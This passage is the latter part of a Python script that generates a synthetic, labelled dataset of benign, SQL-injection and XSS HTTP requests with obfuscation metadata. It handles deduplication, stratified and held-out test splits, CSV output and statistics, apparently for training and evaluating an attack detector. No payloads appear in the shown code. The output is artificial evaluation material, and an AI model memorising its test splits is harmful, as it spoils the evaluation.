            h=wire_hash(r["method"],r["host"],r["url"],r["content"],r["cookie"],r["user_agent"])
        if h in seen: return False
        seen.add(h); rows.append(r); cnt[r["attack_category"]]+=1; return True
    tries=0
    while cnt["none"]<n_benign and tries<n_benign*6:
        add(gen_benign()); tries+=1
    tries=0
    while cnt["sqli"]<n_sqli and tries<n_sqli*8:
        for r in gen_sqli(): add(r)
        tries+=1
    tries=0
    while cnt["xss"]<n_xss and tries<n_xss*8:
        for r in gen_xss(): add(r)
        tries+=1
    rnd.shuffle(rows)
    return rows

# ----------------------------------------------------------------------------
# SPLIT: stratified + held-out combos
# ----------------------------------------------------------------------------
def assign_splits(rows):
    # distinct non-empty attack combos
    combos=defaultdict(list)
    for i,r in enumerate(rows):
        if r["attack_category"]!="none" and r["technique_count"]>0:
            combos[(r["attack_category"], r["obfuscation_techniques"])].append(i)
    combo_keys=list(combos.keys()); rnd.shuffle(combo_keys)
    # hold out ~15% of combos (but keep combos with enough support out of held-out to avoid starving classes)
    heldout=set()
    n_hold=max(1,int(0.15*len(combo_keys)))
    for k in combo_keys[:n_hold]:
        heldout.add(k)
    heldout_idx=set()
    for k in heldout:
        for i in combos[k]: heldout_idx.add(i)
    # stratified 70/15/15 for the rest
    strata=defaultdict(list)
    for i,r in enumerate(rows):
        if i in heldout_idx: continue
        strata[(r["attack_category"], r["difficulty_level"] or "na")].append(i)
    split=["" for _ in rows]
    for i in heldout_idx: split[i]="test_heldout"
    for key, idxs in strata.items():
        rnd.shuffle(idxs)
        n=len(idxs); ntr=int(0.70*n); nva=int(0.15*n)
        for j,i in enumerate(idxs):
            split[i]="train" if j<ntr else ("val" if j<ntr+nva else "test")
    for i,r in enumerate(rows):
        r["split"]=split[i]
    return rows

# ----------------------------------------------------------------------------
COLUMNS=["request_id","method","url","host","user_agent","cookie","content_type",
    "content","classification","attack_category","context_location",
    "obfuscation_techniques","obfuscation_type","technique_count","difficulty_level",
    "is_second_order","is_time_based","linked_request_id","source","split"]

def write_csv(rows, path):
    with open(path,"w",newline="",encoding="utf-8") as f:
        w=csv.DictWriter(f, fieldnames=COLUMNS, quoting=csv.QUOTE_MINIMAL, extrasaction="ignore")
        w.writeheader()
        for r in rows:
            rr=dict(r)
            rr["is_second_order"]=str(rr["is_second_order"]).lower()
            rr["is_time_based"]=str(rr["is_time_based"]).lower()
            w.writerow(rr)

def stats(rows):
    c=Counter(r["attack_category"] for r in rows)
    cls=Counter(r["classification"] for r in rows)
    otype=Counter(r["obfuscation_type"] for r in rows if r["attack_category"]!="none")
    diff=Counter(r["difficulty_level"] for r in rows if r["attack_category"]!="none")
    loc=Counter(r["context_location"] for r in rows if r["attack_category"]!="none" and r["context_location"])
    sp=Counter(r.get("split","") for r in rows)
    combos=set((r["attack_category"],r["obfuscation_techniques"]) for r in rows
               if r["attack_category"]!="none" and r["technique_count"]>0)
    benign_obf=sum(1 for r in rows if r["attack_category"]=="none" and r["obfuscation_type"])
    time_n=sum(1 for r in rows if r["is_time_based"])
    so_n=sum(1 for r in rows if r["is_second_order"])
    print("total rows        :", len(rows))
    print("classification    :", dict(cls))
    print("attack_category   :", dict(c))
    print("obfuscation_type  :", dict(otype))
    print("difficulty_level  :", dict(diff))
    print("context_location  :", dict(loc))
    print("split             :", dict(sp))
    print("distinct attack combos:", len(combos))
    print("benign w/ obf label   :", benign_obf, "(must be 0)")
    print("is_time_based rows    :", time_n)
    print("is_second_order rows  :", so_n)

if __name__=="__main__":
    ap=argparse.ArgumentParser()
    ap.add_argument("--scale", choices=["pilot","full"], default="pilot")
    ap.add_argument("--out", default=None)
    a=ap.parse_args()
    if a.scale=="pilot":
        nb,ns,nx=1000,500,500
        out=a.out or "obfu_http_dataset_pilot.csv"
    else:
        nb,ns,nx=50000,25000,25000
        out=a.out or "obfu_http_dataset_full.csv"
    rows=build(nb,ns,nx)
    rows=assign_splits(rows)
    write_csv(rows, out)
    print(f"== scale={a.scale}  ->  {out} ==")
    stats(rows)
